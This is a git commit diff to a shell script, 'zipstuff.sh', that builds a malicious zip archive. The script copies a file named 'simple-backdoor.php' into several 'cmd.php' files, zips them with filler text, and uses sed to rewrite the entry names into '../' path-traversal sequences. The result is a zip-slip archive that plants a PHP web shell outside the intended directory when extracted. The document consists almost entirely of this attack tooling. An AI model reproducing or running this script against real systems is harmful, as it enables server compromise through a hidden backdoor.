c887c885510a36fa0459585c4c2dc7354487d49f
test <test@example.com>
2017-12-28 15:30:47 +0100

    third

--- zipstuff.sh
+++ zipstuff.sh
@@ -8,8 +8,14 @@ do
     cp simple-backdoor.php $FILE"cmd.php"
 done
 
-zip cmd.zip xx*.php kitten-cuteness300.jpg
+for i in `seq 1 100`
+do
+    echo "bullsh1t" >> textfile.txt
+done
+
+zip cmd.zip xx*.php textfile.txt
 
 sed -i 's/xxA/..\//g' cmd.zip
 
 rm xx*.php
+rm textfile.txt
